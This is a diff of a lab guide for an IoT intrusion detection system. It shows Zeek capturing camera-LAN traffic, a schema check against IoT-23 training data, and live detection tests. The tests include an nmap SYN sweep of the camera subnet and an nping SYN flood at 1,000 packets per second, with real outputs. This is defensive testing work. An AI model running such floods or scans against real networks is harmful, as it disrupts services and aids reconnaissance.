-> **Verification Methodology:** Prove Zeek sniffs live binary frames in promiscuous mode without an IP, extracts 27 behavioral features, and verifies schema matching.
+> **Method:** Show that Zeek listens on the camera LAN bridge, that one live request immediately becomes a Zeek flow record, and that live flows have the same 27 feature columns as the training data.
 
-> 💡 **What is Promiscuous Mode? (Conceptual Explanation):**
-> 
-> - **Normal Mode:** Network cards only accept packets addressed to their own MAC address, discarding other frames.
-> - **Promiscuous Mode:** Disables MAC filtering, capturing and inspecting every Ethernet frame traversing the switch.
-> - **Why is this critical for our project?**
->   - Camera and NVR exchange high-throughput RTSP video, while attackers inject malicious probes.
->   - Packets are not addressed to the Zeek sensor (Zeek has no assigned IP address; it is a passive listener).
->   - Attached in **promiscuous mode**, Zeek copies and inspects all raw packets with zero latency impact and zero packet drops on the camera stream.
+> 💡 **What is Promiscuous Mode?**
+> - **Normal mode:** a network card keeps only frames sent to its own MAC address.
+> - **Promiscuous mode:** the card keeps every frame it sees.
+> - **Why it matters here:** the camera–NVR video and the attacker's packets are not sent to the sensor. Zeek has no IP on the camera LAN; it only listens on the bridge (like a switch mirror port in the real lab) and copies the packets.
 
 ---
 
-#### Step 1: Prove Zeek Sensor Listens to the Switch Bridge in Promiscuous Mode:
-
-> 1. **💡 Why We Are Doing This (Requirement & Objective)**
-To verify that the Zeek sensor is genuinely bound to the network bridge interface and actively operating as a passive packet sniffer.
-
-> 2. **⚙️ What Happens Under the Hood When Run**
-Inspects stdout logs from the Zeek container to confirm the sniffer engine bound to the virtual interface.
+#### Step 1: Show Zeek is Listening on the Camera LAN Bridge:
 
 ```powershell
 docker logs ids-lab-sensor --tail 2
 ```
+- `docker logs ids-lab-sensor`: the start-up messages of the Zeek container.
+- `--tail 2`: only the last 2 lines.
 
-##### 🔍 Line-by-Line Breakdown:
-- `docker logs ids-lab-sensor`: Reads stdout logs generated by the Zeek sensor container.
-- `--tail 2`: Displays the latest 2 lines.
-
-> 5. **📋 Verified Output**
+> 📋 **Real Output:**
 ```text
 listening on br-ids-lan
 ```
-
-> 6. **📊 Output Breakdown (Explaining every returned metric/field)**
-- `listening on br-ids-lan`: Confirms Zeek's packet capture engine is actively listening to virtual bridge `br-ids-lan` in promiscuous mode.
+- Zeek is capturing on bridge `br-ids-lan` (the camera LAN).
 
 ---
 
-#### Step 2: Inject a Live Packet and Prove Zeek Immediately Writes to `conn.log` (Live Injection Test):
+#### Step 2: Send One Live Request and Show the Zeek Record:
 
-> 1. **💡 Why We Are Doing This (Requirement & Objective)**
-Demonstrates to the supervisor that Zeek captures live packets in real time and writes connection records immediately.
-
-> 2. **⚙️ What Happens Under the Hood When Run**
-1. Admin PC sends an HTTP TCP SYN to camera Port 80 via Python.
-2. Camera responds with SYN-ACK; Admin PC sends ACK (TCP 3-way handshake completes).
-3. Admin PC issues an HTTP GET, receives HTML response, and initiates connection teardown (FIN/ACK).
-4. Zeek captures all 12 frames, evaluates TCP state flags, and flushes the flow to `conn.log`.
-5. PowerShell `Get-Content -Tail 1` displays the newly written flow record.
-
-##### ❓ What Are the "12 Frames" and How Were Exactly 12 Exchanged? (12 Frames Deep-Dive):
-
-> **Definition (Frames vs Packets):**  
-> In network engineering (OSI Layer 2), binary data units traversing cables and switches are termed **Frames** (Ethernet Frames). At Layer 3/4 they encapsulate TCP/IP **Packets**.
-
-During an HTTP GET exchange, exactly 12 frames are transmitted:
-- **Frames sent by Admin PC to Camera:** 6 (`orig_pkts: 6`)
-- **Frames sent by Camera to Admin PC:** 6 (`resp_pkts: 6`)
-- **Total Frame Count:** $6 + 6 = 12$ Frames!
-
-The exact sequential breakdown of all 12 Ethernet frames is detailed below:
-
-| Frame # | Sender | Receiver | TCP Packet Type & Description | Zeek History Flag | Operational Purpose |
-| :---: | :---: | :---: | :---: | :---: | :--- |
-| **Frame 1** | Admin PC (`192.168.50.10`) | Camera (`192.168.50.30`) | `TCP [SYN]` | `S` | TCP 3-Way Handshake initiation |
-| **Frame 2** | Camera (`192.168.50.30`) | Admin PC (`192.168.50.10`) | `TCP [SYN, ACK]` | `h` | Camera acknowledges connection request |
-| **Frame 3** | Admin PC (`192.168.50.10`) | Camera (`192.168.50.30`) | `TCP [ACK]` | `A` | Handshake established successfully |
-| **Frame 4** | Admin PC (`192.168.50.10`) | Camera (`192.168.50.30`) | `TCP [PSH, ACK]` + HTTP GET | `D` | Admin PC requests camera webpage (`GET /`) |
-| **Frame 5** | Camera (`192.168.50.30`) | Admin PC (`192.168.50.10`) | `TCP [ACK]` | `a` | Camera acknowledges receipt of GET request |
-| **Frame 6** | Camera (`192.168.50.30`) | Admin PC (`192.168.50.10`) | `TCP [PSH, ACK]` + HTTP 200 OK | `d` | Camera transmits HTML webpage payload |
-| **Frame 7** | Admin PC (`192.168.50.10`) | Camera (`192.168.50.30`) | `TCP [ACK]` | - | Admin PC acknowledges receipt of webpage payload |
-| **Frame 8** | Camera (`192.168.50.30`) | Admin PC (`192.168.50.10`) | `TCP [FIN, ACK]` | `f` | Camera initiates connection close |
-| **Frame 9** | Admin PC (`192.168.50.10`) | Camera (`192.168.50.30`) | `TCP [ACK]` | - | Admin PC acknowledges camera close request |
-| **Frame 10** | Admin PC (`192.168.50.10`) | Camera (`192.168.50.30`) | `TCP [FIN, ACK]` | `F` | Admin PC completes connection termination |
-| **Frame 11** | Camera (`192.168.50.30`) | Admin PC (`192.168.50.10`) | `TCP [ACK]` | - | Final handshake acknowledgment |
-| **Frame 12** | Admin PC (`192.168.50.10`) | Camera (`192.168.50.30`) | `TCP [ACK]` | - | Final socket teardown acknowledgment |
-
-> **💡 Evidence Proven to the Supervisor:**  
-> The output fields `"orig_pkts": 6, "resp_pkts": 6` ($6+6=12$) and `history: "ShADadfF"` mathematically prove that Zeek captured all 12 Ethernet frames and tracked every TCP header flag in its state machine.
+> ⚙️ **Under the hood:** The admin PC (`192.168.50.10`) opens the camera web page with `curl`. Zeek follows the TCP connection, and when it ends, writes one line to `conn.log`. We wait 8 seconds so Zeek has written the line.
 
 ```powershell
-docker exec ids-lab-admin python -c "import urllib.request; urllib.request.urlopen('http://192.168.50.30/')"
-Get-Content lab_virtual\zeek_logs\conn.log | Select-String "192.168.50.10" | Select-Object -Last 1
+docker exec ids-lab-admin curl -s -o /dev/null -w "HTTP %{http_code}, %{size_download} bytes" http://192.168.50.30/
+Start-Sleep 8
+Get-Content lab_virtual\zeek_logs\conn.log | Select-String '"id.orig_h":"192.168.50.10","id.orig_p":[0-9]*,"id.resp_h":"192.168.50.30","id.resp_p":80' | Select-Object -Last 1
 ```
 
 ##### 🔍 Line-by-Line Breakdown:
-- `docker exec ids-lab-admin`: Executes a shell command inside the running Admin PC container.
-- `python -c "..."`: Executes an inline Python command inside the container (`-c` = command).
-- `import urllib.request; urllib.request.urlopen('http://192.168.50.30/')`: Sends an authentic HTTP GET request from Admin PC to the camera Web Server (`192.168.50.30:80`).
-- `Get-Content lab_virtual\zeek_logs\conn.log | Select-String "192.168.50.10" | Select-Object -Last 1`: Reads and prints the latest connection record originated by Admin PC (`192.168.50.10`). *(Filtering by `"192.168.50.10"` isolates the Admin PC HTTP request, ignoring concurrent benign background traffic such as camera cloud sync pings on port 443).*
+- `docker exec ids-lab-admin curl -s ... http://192.168.50.30/`: the admin PC downloads the camera page (`-s` = quiet; `-o /dev/null` = do not print the page, inside the Linux container; `-w` = print the status and size).
+- `Start-Sleep 8`: wait until Zeek writes the finished connection.
+- `Select-String '..."id.orig_h":"192.168.50.10"...80'`: keep only admin PC → camera port 80 lines (this hides the camera's cloud traffic and the NVR stream). The pattern is in **single quotes** because it contains double quotes.
+- `Select-Object -Last 1`: the newest such line.
 
-##### 📋 Verified Output:
+##### 📋 Real Output (13 Nov 2026):
+```text
+HTTP 200, 5478 bytes
+```
 ```json
-{"ts":1794390662.04,"uid":"CiKgoa1TTSstcUREd8","id.orig_h":"192.168.50.10","id.orig_p":41326,"id.resp_h":"192.168.50.30","id.resp_p":80,"proto":"tcp","service":"http","duration":0.0015,"orig_bytes":127,"resp_bytes":153,"conn_state":"SF","history":"ShADadfF","orig_pkts":6,"resp_pkts":6}
+{"ts":1794555951.137147,"uid":"CJ97dO10ieapu8Fta3","id.orig_h":"192.168.50.10","id.orig_p":44800,"id.resp_h":"192.168.50.30","id.resp_p":80,"proto":"tcp","service":"http","duration":0.0009369850158691406,"orig_bytes":77,"resp_bytes":5618,"conn_state":"SF","local_orig":true,"local_resp":true,"missed_bytes":0,"history":"ShADadfF","orig_pkts":6,"orig_ip_bytes":397,"resp_pkts":6,"resp_ip_bytes":5938,"ip_proto":6}
 ```
 
-##### 📊 Output Breakdown (Line-by-Line Explanation):
-- `ts: 1794390662.04`: Precise UNIX epoch timestamp when this connection crossed the switch bridge.
-- `uid: "CiKgoa1TTSstcUREd8"`: Unique connection identifier assigned by Zeek for cross-log correlation.
-- `id.orig_h: "192.168.50.10"` & `id.orig_p: 41326`: Originator IP and ephemeral port (Admin PC).
-- `id.resp_h: "192.168.50.30"` & `id.resp_p: 80`: Responder IP and destination service port (Camera Web Server).
-- `proto: "tcp"` & `service: "http"`: Transport protocol is TCP and application protocol is identified as HTTP.
-- `duration: 0.0015`: Elapsed time for the complete HTTP transaction was 0.0015 seconds (1.5 milliseconds).
-- `orig_bytes: 127` & `resp_bytes: 153`: 127 payload bytes sent by Admin PC (HTTP GET) and 153 payload bytes returned by Camera (HTTP 200 OK HTML).
-- `conn_state: "SF"`: Normal Establishment and Termination (orderly SYN handshake through FIN termination).
-- `history: "ShADadfF"`: Precise TCP flag tracking computed by Zeek State Machine:
-  - `S` = SYN (Initial handshake SYN from Admin PC)
-  - `h` = SYN-ACK (Handshake response from Camera)
-  - `A` = ACK (Handshake completion ACK from Admin PC)
-  - `D` = Data from originator (HTTP GET request payload from Admin PC)
-  - `a` = ACK from responder (TCP acknowledgment of GET from Camera)
-  - `d` = Data from responder (HTTP 200 OK payload returned by Camera)
-  - `f` = FIN from responder (Teardown initiation from Camera)
-  - `F` = FIN from originator (Teardown completion from Admin PC)
-- `orig_pkts: 6` and `resp_pkts: 6`: Total Ethernet frames exchanged bidirectionally ($6 + 6 = 12$ frames).
+##### 📊 Output Breakdown:
+- `ts`: the time of the connection (UNIX seconds).
+- `uid`: Zeek's ID for this connection (the same ID links `conn.log`, `http.log` and `files.log`).
+- `id.orig_h` / `id.orig_p`: the admin PC and its temporary port.
+- `id.resp_h` / `id.resp_p`: the camera and port 80.
+- `proto: tcp`, `service: http`: Zeek recognised HTTP from the content.
+- `duration: 0.0009`: the whole request took about 0.9 ms.
+- `orig_bytes: 77`: the size of the HTTP GET request; `resp_bytes: 5618`: the camera page (5,478 bytes, as `curl` printed) plus the HTTP headers.
+- `conn_state: SF`: normal start (SYN) and normal end (FIN).
+- `orig_pkts: 6`, `resp_pkts: 6`: packets seen in each direction.
+- `missed_bytes: 0`: no data missing in this connection.
+- `history: ShADadfF` — Zeek's record of the TCP steps (capital = from the admin PC, small = from the camera):
 
-##### 🔬 Scientific Meaning & Proof:
-The TCP State Machine flags `ShADadfF` and duration 0.0015s prove that Zeek is actively performing deep packet inspection on live network packets traversing the virtual switch in real time.
+| Letter | Meaning in this connection |
+| :---: | :--- |
+| `S` | Admin PC sends SYN (start) |
+| `h` | Camera answers SYN-ACK |
+| `A` | Admin PC sends ACK (connection open) |
+| `D` | Admin PC sends data (the HTTP GET) |
+| `a` | Camera sends a pure ACK |
+| `d` | Camera sends data (the web page) |
+| `f` | Camera sends FIN (closes its side) |
+| `F` | Admin PC sends FIN (closes its side) |
+
+> **Note:** use `curl` here. Python's `urllib` sometimes closes with a reset (we saw `RSTO`, `ShADadfR`, 6 + 5 packets on 13 Nov), so its record is less tidy.
+
+##### 🔬 What It Proves:
+One real request becomes one Zeek flow record with full TCP state, seconds after it ends. This is the input of the whole pipeline.
 
 ---
 
-#### Step 3: Verify Live Zeek Flow Schema 100% Matches IoT-23 Reference (Automated Schema Check):
+#### Step 3: Schema Check — Live Zeek Flows vs. IoT-23 Training Data (Step 22, RQ3):
 
-##### 💡 Why We Are Doing This:
-The AI Model was trained on Stratosphere IoT-23. To prevent runtime prediction crashes, every live Zeek flow must 100% match the feature names, data types, and value bounds of the training corpus (Zero Training-Serving Skew).
+> 💡 **Why:** The model was trained on IoT-23. The live pipeline must give the model the **same 27 columns**, with the same types, no missing values and no impossible values. The tool also reports **how different** the live traffic is.
 
-##### ⚙️ What Happens Under the Hood:
-`tools/schema_check.py` parses live flows from `conn.log`, validates all 27 behavioral feature columns against the IoT-23 training reference, and checks data types, nulls, and statistical distributions.
+> ⚙️ **Under the hood:** `tools/schema_check.py` makes the 27 features from the live `conn.log` with the same code used in training (`ml_engine/features.py`, `ml_engine/window_features.py`), compares them with the training features (1,384,070 rows), runs the model on them, and writes `reports/schema_check.md`.
 
 ```powershell
 .venv\Scripts\python.exe tools\schema_check.py --live-path lab_virtual\zeek_logs\conn.log --source real
 ```
+- `--live-path ...conn.log`: the live Zeek file.
+- `--source real`: the report labels the data as a real capture (not synthetic).
 
-##### 🔍 Line-by-Line Breakdown:
-- `.venv\Scripts\python.exe`: Python virtual environment interpreter.
-- `tools\schema_check.py`: Automated tool evaluating schema alignment and feature consistency.
-- `--live-path lab_virtual\zeek_logs\conn.log`: Path to active live Zeek log.
-- `--source real`: Directs validator to treat input as genuine live sensor output.
-
-##### 📋 Verified Output:
+##### 📋 Real Output (last lines, 13 Nov 2026):
 ```text
-Offline sample size: 1,384,070 rows | Live sample size: 20,929 rows
+Offline sample size: 1384070 rows | Live sample size: 10674 rows
 Schema Audit Results: Columns=True | Dtypes=True | Nulls=True | Ranges=True | Inference=True => OVERALL=PASS
+Format check passed (see the report for distribution and category differences).
 ```
 
 ##### 📊 Output Breakdown:
-- `Columns=True`: All 27 feature columns match identically between offline dataset and live sensor.
-- `Dtypes=True`: Data types (Float, Integer, String) match without type coercion.
-- `Nulls=True`: Zero unexpected null or missing values detected.
-- `Ranges=True`: Feature values fall within valid physical domain boundaries.
-- `OVERALL=PASS`: Training-serving skew is 0%. Live flows directly feed the ML inference engine with zero preprocessing mismatch.
+- `Columns=True`: the same 27 columns in the same order.
+- `Dtypes=True`: the same data types.
+- `Nulls=True`: no missing values.
+- `Ranges=True`: no negative counts, ratios between 0 and 1.
+- `Inference=True`: the model gives valid probabilities on the live features.
+- `Live sample size`: the number of flows in the current `conn.log`. It grows with time since the sensor started (2,617 flows about 10 minutes after a sensor restart; 10,674 earlier the same day). The result was PASS both times.
+- **In the report (`reports/schema_check.md`):** 14 of 27 features have a large distribution shift (KS ≥ 0.3), for example `duration`, `orig_pkts`, `pair_gap`; and 2 features (`service`, `history`) have values never seen in training.
 
-#### 🖥️ Dashboard Live UI Demonstration Steps:
-Open **`http://localhost:5000/overview`** in the browser before the supervisor:
-1. **Show the "System Status" Card:**
-- **Pipeline Status:** Displays `Running` in green, confirming active packet tailing.
-- **Flows Processed:** Total count of network connection flows parsed and evaluated by the ML pipeline.
-- **Throughput:** Shows sub-millisecond per-flow processing speeds (>120,000 flows/sec batch capacity).
-- **Spoken Phrase:** *"Sir, as shown on our Overview Dashboard, the live pipeline is running continuously, actively processing packets sniffed by Zeek without packet loss."*
+##### 🔬 What It Proves (and does not prove):
+- **Proves:** the live pipeline makes exactly the input the model expects (format PASS).
+- **Does not prove:** that live traffic looks like IoT-23. It does not; the shift is a domain difference and is the answer we report for RQ3. The final RQ3 answer uses real camera traffic (Step 22 in the hardware lab).
 
-#### Spoken English Script (For Supervisor):
-> *"Sir, to prove FR-01, our Zeek sensor passively sniffs the camera switch br-ids-lan in promiscuous mode. When I trigger a live HTTP request from our Admin PC, Zeek intercepts the exact 12 link-layer Ethernet frames within 1.5 milliseconds, recording the TCP state machine flags 'ShADadfF'. Furthermore, our automated schema audit on 20,929 live flows confirms a 100% schema match with IoT-23 with zero training-serving skew, satisfying both FR-01 and Research Question RQ3."*
+> ⚠️ This command rewrites `reports/schema_check.md` and `reports/schema_check.csv`. That is expected.
+
+#### 🖥️ Dashboard:
+Open **`/overview`** → **SYSTEM STATUS (MEASURED)**: the pipeline is running and **MONITORED FLOWS** grows every few seconds.
+
+#### 🗣️ Spoken Script:
+> *"Sir, for FR-01, Zeek listens on the camera LAN bridge without an IP address. When the admin PC opens the camera page with curl, Zeek writes one connection record with the full TCP history 'ShADadfF', 6 packets each way. Our schema check on more than ten thousand live flows passes the format test: the same 27 columns, types and ranges as the IoT-23 training data. The same report also shows that 14 features are distributed differently from IoT-23. We report this as a domain difference for RQ3, and we will repeat it on the real camera."*
 
 ---
 
-### FR-02: Calibrated Multi-Class ML Inference & Real-Time Attack Detection (Must / Live Attack Suite)
+### FR-02: Multi-Class ML Inference & Live Attack Detection (Must / Live Attack Suite)
 
 > **Proposal Requirement:** "Put each usable flow into a class; give back the class, the confidence and the model version."  
-> **Verification Methodology:** Rather than running custom Python script files, we execute **5 authentic, standard command-line tools (`curl`, `nping`, `nmap`, `nc`)** across our virtual lab Docker network. Every command explicitly proves the exact attack type through its standard networking flags (`nping --flags syn` for SYN flood, `nmap -sS` for stealth port scan, `nc` for C&C botnet beacon, `curl` for malware binary download, and `curl` for authorized web access). We demonstrate real command completion in the terminal, Zeek sniffer flow capture, Random Forest multi-class inference, real-time WebSocket alert pop-up on the Web Dashboard, and autonomous firewall mitigations on the router.
+> **Method:** We run 5 tests with standard tools (`curl`, `nmap`, `nping`, `nc`) and show, for each one: the command output, the Zeek record, the alert (class, confidence, model version) and the router's response.
 
-#### 💡 Why We Use Authentic Command-Line Attack Tools (`curl`, `nping`, `nmap`, `nc`):
-1. **Prove the Attack Type from the Command Itself:** Anyone reviewing the command immediately recognizes the standard cyber security tool and attack flags without questioning what an internal script might be doing.
-2. **True Network Layer Traffic Generation:** Packets are constructed and transmitted by industry-standard networking binaries across the Linux bridges (`br-ids-lan`, `br-ids-out`).
-3. **End-to-End Pipeline Verification:** Proves that Zeek captures real packets, the ML bundle (v3.1.0) discriminates between all 5 proposal classes (`Benign`, `DDoS_DoS`, `PortScan`, `CnC`, `Malware_Download`), and the Router autonomously applies distinct mitigations (`limit_src`, `block_dst`, or allowlist protection).
+#### 💡 How the response decision works (say this before the tests):
+1. **Alert:** every attack class raises an alert at confidence ≥ 0.30.
+2. **Automatic action** needs **all** of these (`core_engine/response_policy.py`):
+   - automatic response switched ON (it is ON in the virtual lab only);
+   - confidence ≥ the class threshold: **CnC 0.30 → block, PortScan 0.88 → block, DDoS_DoS 0.30 → rate-limit (D-055), Malware_Download → alert only**;
+   - the target is not on the allowlist and is not a camera-LAN device;
+   - **3 alerts of the same class for the same target within 60 s**;
+   - a rule time of at most 30 minutes.
+3. A program download is found by a **file-type rule** on Zeek's `files.log` (`core_engine/file_check.py`), not by the model. IoT-23 has only about 84 real download flows, too few to learn from (model card, section 6).
+
+#### ⚙️ Command to read the alerts (use after each test, or show the Live Alerts page):
+The **Live Alerts** page (`/alerts`) shows each alert as it arrives. In the terminal, the newest events can be read with:
+```powershell
+.venv\Scripts\python.exe -c "
+import urllib.request, json
+with open('lab_virtual/keys/dashboard_login.txt') as f:
+    u, p = f.read().strip().split()[:2]
+req = urllib.request.Request('http://127.0.0.1:5000/api/auth/login', data=json.dumps({'username':u,'password':p}).encode(), headers={'Content-Type':'application/json'})
+tok = json.loads(urllib.request.urlopen(req).read())['token']
+ev = json.loads(urllib.request.urlopen(urllib.request.Request('http://127.0.0.1:5000/api/events?limit=5', headers={'Authorization':'Bearer '+tok})).read())['events']
+for e in ev:
+    print(e['timestamp'][11:19], e['predicted_class'], round(e['confidence'], 2), e['src_ip'], '->', e['dst_ip'] + ':' + str(e['dst_port']), 'flows', e.get('flow_count'), '| response', e.get('response_status'), e.get('response_reason') or '', '| model', e['model_version'])
+"
+```
+- The times are UTC.
+
+> ⚠️ Run `.venv\Scripts\python.exe lab_virtual\lab.py reset` **between the tests**. A block from one test stops the next one.
 
 ---
 
-#### 🧪 5 Real Attack & Traffic Commands (Live Terminal Execution & Dashboard Proof):
+#### [Test 2.1] Benign: Admin Opens the Camera Web Page (`curl`)
 
----
+💡 **Objective:** Normal admin access is classed Benign and gives no alert and no block.
 
-#### [Test 2.1] Real Benign Web Access & Live Video Traffic (Benign Verification)
-💡 **Objective:** Prove that when an authorized administrator accesses the camera web portal using standard `curl`, the IDS classifies the traffic as `Benign` with >99% confidence, triggering zero false alarms and zero service disruption.
+⚙️ **Under the hood:** The admin PC (`192.168.50.10`, on the allowlist) downloads the camera page. Zeek records a normal `SF` connection; the model predicts Benign; the flow is counted in the benign traffic summary only.
 
-⚙️ **What Happens Under the Hood:**
-The authorized Admin PC container (`192.168.50.10`) issues a standard HTTP GET request using `curl` to the camera web server (`192.168.50.30:80`). Zeek logs a healthy TCP connection with connection state `SF` (Normal SYN-FIN completion).
-
-💻 **Terminal Command to Execute:**
+💻 **Command:**
 ```powershell
 docker exec ids-lab-admin curl -s http://192.168.50.30/ | Select-String "Lab IP camera"
 ```
+- `curl -s http://192.168.50.30/`: download the camera page quietly.
+- `Select-String "Lab IP camera"`: show only the lines with the camera's name.
 
-##### 🔍 Line-by-Line Breakdown:
-- `docker exec ids-lab-admin`: Executes inside the authorized Admin PC container (`192.168.50.10`).
-- `curl -s http://192.168.50.30/`: Standard CLI HTTP tool sending a genuine web request to the camera web interface.
-- `Select-String "Lab IP camera"`: Verifies that the camera returned its legitimate HTML web interface page.
-
-##### 📋 Verified Terminal Output:
+📋 **Real Output:**
 ```text
     <title>Lab IP Camera - Live Web Interface</title>
             <h1>Lab IP camera</h1>
 ```
 
-##### 🕵️ Zeek Sensor Sniffing Proof (`conn.log`):
-```json
-{"id.orig_h":"192.168.50.10","id.orig_p":40828,"id.resp_h":"192.168.50.30","id.resp_p":80,"proto":"tcp","conn_state":"SF","orig_bytes":57,"resp_bytes":12}
-```
+🕵️ **Zeek record:** the same kind of line as FR-01 Step 2: `"conn_state":"SF"`, `"history":"ShADadfF"`, `"resp_bytes":5618`.
 
-##### 🖥️ Dashboard & Firewall Verification:
-1. **Live Alerts Page (`http://localhost:5000/alerts`):**
-   - **Zero False Alarms:** No red or yellow alert cards pop up. The system correctly passes normal operations.
-2. **Overview Page (`http://localhost:5000/overview`):**
-   - **"Monitored Flows"** counter increases; safe traffic logged under benign telemetry.
-3. **Router Firewall (`ids-lab-router`):**
-   - `block_src`, `block_dst`, and `limit_src` sets remain empty. Admin PC and Camera remain on the immutable allowlist.
+🖥️ **Dashboard & firewall:**
+- **Live Alerts:** no new card.
+- **Overview:** **MONITORED FLOWS** grows.
+- **Router:** `block_src`, `block_dst`, `limit_src` stay empty.
+- Background evidence (entry 3.78): about 6 hours of normal traffic (12 Nov 18:05 to 13 Nov 00:09 UTC) gave no alert for the camera, NVR or admin PC.
 
 ---
 
-#### [Test 2.2] Real DDoS TCP SYN Flood Attack (`nping` Raw Packet Blaster)
-💡 **Objective:** Launch a high-rate raw socket TCP SYN flood against camera port 80 using `nping` (the official Nmap packet generator). Prove the attack flags prove a textbook DDoS attack, Zeek captures the flood, the ML model classifies it as `DDoS_DoS` (~43% - 45% confidence winning class), a red alert pops up on the Dashboard, and the Router Firewall autonomously rate-limits the attacker IP.
+#### [Test 2.2] PortScan: Attacker Sweeps the Camera Subnet (`nmap`)
 
-⚙️ **What Happens Under the Hood:**
-`nping` constructs raw TCP SYN packets with half-open connection flags, firing 1,000 packets per second for 5 seconds (5,000 total packets) from attacker (`10.10.10.50`) to Camera (`192.168.50.30:80`). Zeek logs state `RSTO`/`ShR` with massive packet density, prompting the Decision Engine to trigger `AUTO_DDOS_RATELIMIT`.
+💡 **Objective:** An outside scan of the camera LAN raises **PortScan** alerts.
 
-💻 **Terminal Command to Execute:**
+⚙️ **Under the hood:** `nmap -sS` sends TCP SYN probes to ports 23, 80 and 554 on all 256 addresses of `192.168.50.0/24`. Closed ports answer with a reset (`REJ`), and silent addresses give `S0`. The window features (`src_conn_60s`, `src_udst_60s`, `src_uport_60s`) grow fast because one source touches many addresses and ports in a few seconds.
+
+💻 **Command:**
 ```powershell
-docker exec ids-lab-attacker nping --tcp -p 80 --flags syn --rate 1000 -c 5000 192.168.50.30
+docker exec ids-lab-attacker nmap -sS -p 23,80,554 192.168.50.0/24 | Select-String "Nmap done|Nmap scan report"
 ```
+- `-sS`: TCP SYN scan (half-open; the handshake is never finished).
+- `-p 23,80,554`: Telnet, HTTP, RTSP — the usual camera ports.
+- `192.168.50.0/24`: the whole camera LAN.
+- `Select-String`: show only the found hosts and the summary.
 
-##### 🔍 Line-by-Line Breakdown:
-- `docker exec ids-lab-attacker`: Runs inside the external attacker machine (`10.10.10.50`).
-- `nping`: Industry-standard network packet generation binary from the Nmap project.
-- `--tcp -p 80`: Targets the camera's HTTP web management port 80.
-- `--flags syn`: Specifically crafts raw TCP SYN packets (half-open connection flood).
-- `--rate 1000`: Blasts 1,000 packets per second.
-- `-c 5000`: Transmits exactly 5,000 packets.
-- `192.168.50.30`: Target IP address of the camera.
-
-##### 📋 Verified Terminal Output:
+📋 **Real Output (13 Nov 2026):**
 ```text
-Starting Nping 0.7.99 ( https://nmap.org/nping )
-Raw packets sent: 5000 (270.000KB) | Rcvd: 2625 (115.500KB) | Lost: 2375 (47.50%)
-Nping done: 1 IP address pinged in 6.46 seconds
-```
-*(47.50% packet loss proves the camera was overwhelmed by the flood!)*
-
-##### 🕵️ Zeek Sensor Sniffing Proof (`conn.log`):
-```json
-{"id.orig_h":"10.10.10.50","id.orig_p":32021,"id.resp_h":"192.168.50.30","id.resp_p":80,"proto":"tcp","conn_state":"RSTO","history":"ShR","orig_pkts":517,"resp_pkts":8}
+Nmap scan report for 192.168.50.1
+Nmap scan report for 192.168.50.5
+Nmap scan report for 192.168.50.10
+Nmap scan report for 192.168.50.20
+Nmap scan report for 192.168.50.30
+Nmap scan report for 192.168.50.254
+Nmap done: 256 IP addresses (6 hosts up) scanned in 4.31 seconds
 ```
 
-##### 🖥️ Dashboard & Firewall Verification:
-1. **Live Alerts Page (`http://localhost:5000/alerts`):**
-   - Within 1-2 seconds, **without refreshing the browser**, a bright red **`DDoS_DoS`** alert card appears live via WebSocket.
-   - **Source:** `10.10.10.50` -> **Destination:** `192.168.50.30:80`
-   - **Confidence:** ~43.2% (Top winning class out of 5 multiclass categories, comfortably exceeding the 35% DDoS response policy threshold)
-   - **Evidence Note:** `High-rate packet flood: directed at 192.168.50.30:80 (Reason: DOS_HIGH_RATE_PACKET_FLOOD)`.
-   - **Response Status:** `rate_limited`
-2. **Router Firewall Rate Limit Proof:**
-   - Execute in terminal:
-     ```powershell
-     docker exec ids-lab-router nft list set inet ids limit_src
-     ```
-   - **Output:**
-     ```text
-     table inet ids {
-         set limit_src {
-             type ipv4_addr
-             flags timeout
-             elements = { 10.10.10.50 timeout 30m expires 29m50s }
-         }
-     }
-     ```
-     Confirms the router kernel throttled the attacker source (`limit rate over 200/second burst 5 packets drop`), preventing camera collapse!
+🚨 **Alerts (real, 13 Nov 2026):**
+```text
+07:47:55 PortScan 0.49 10.10.10.50 -> 192.168.50.5:80    | response none
+07:47:55 PortScan 0.51 10.10.10.50 -> 192.168.50.10:80   | response none
+07:47:55 PortScan 0.86 10.10.10.50 -> 192.168.50.254:80  flows 3 | response none
+```
+- Evidence note on the card: `Unanswered TCP probe sweep: conn_state=S0, resp_pkts=0, ... (Confidence: 85.7%)`, reason `SCAN_RAPID_PROBE_SWEEP`.
+
+🛡️ **Router:** `block_src` stays empty. PortScan blocking needs confidence ≥ 0.88 **and** 3 alerts in 60 s; the highest in this run was 0.86. The confidence changes from run to run: on 13 Nov the same sweep gave 0.86, **0.88** (response `candidate`, reason `SKIP_NOT_REPEATED` — 1 of the 3 alerts needed) and 0.64. So the PortScan alert always appears, but a block does not.
+
+> ⚠️ **Do not use a scan of one host for this demo.** `nmap -sS -p 23,80,554 192.168.50.30` (one host, 3 ports) gave **one CnC alert (0.48), not PortScan**, on 13 Nov. Too few flows for the window features (see Part 7, issues 43 and 46).
+
+> ⚠️ **Run this test soon after a fresh backend start (Section 1, step 3b).** After about an hour of repeated floods and scans from `10.10.10.50`, the same sweep gave **CnC 0.52** and the attacker was blocked (`AUTO_CNC_DEST_BLOCK`). Right after a restart it gave PortScan 0.84 again.
 
 ---
 
-#### [Test 2.3] Real PortScan Reconnaissance Attack (`nmap` Stealth SYN Sweep)
-💡 **Objective:** Launch an authentic reconnaissance scan from the attacker to discover camera management and video streaming ports using `nmap`. Prove the command flags prove reconnaissance, Zeek flags the probe sweep, the ML model classifies it as `PortScan` (92.78% confidence), and the Dashboard pops up a yellow alert.
+#### [Test 2.3] DDoS: TCP SYN Flood on Camera Port 80 (`nping`)
 
-⚙️ **What Happens Under the Hood:**
-The attacker executes `nmap -sS` (TCP SYN stealth scan) against Camera ports 23 (Telnet), 80 (HTTP), and 554 (RTSP). Zeek detects unanswered half-open connection attempts (`conn_state: S0`), triggering `SCAN_RAPID_PROBE_SWEEP`.
+💡 **Objective:** A high-rate SYN flood from outside raises **DDoS_DoS** alerts, and the router **rate-limits** the source (D-055).
 
-💻 **Terminal Command to Execute:**
+⚙️ **Under the hood:** `nping` builds raw TCP SYN packets: 1,000 per second, 5,000 in total, from `10.10.10.50` to `192.168.50.30:80`. Zeek writes thousands of short half-open flows. The model predicts DDoS_DoS; after 3 alerts in 60 s, the policy adds the attacker to `limit_src` (packets over 200/s are dropped).
+
+💻 **Command:**
 ```powershell
-docker exec ids-lab-attacker nmap -sS -p 23,80,554 192.168.50.30
+docker exec ids-lab-attacker nping --tcp -p 80 --flags syn --rate 1000 -c 5000 192.168.50.30 | Select-String "Starting|Raw packets|Nping done"
 ```
+- `--tcp -p 80`: TCP to port 80 (camera web page).
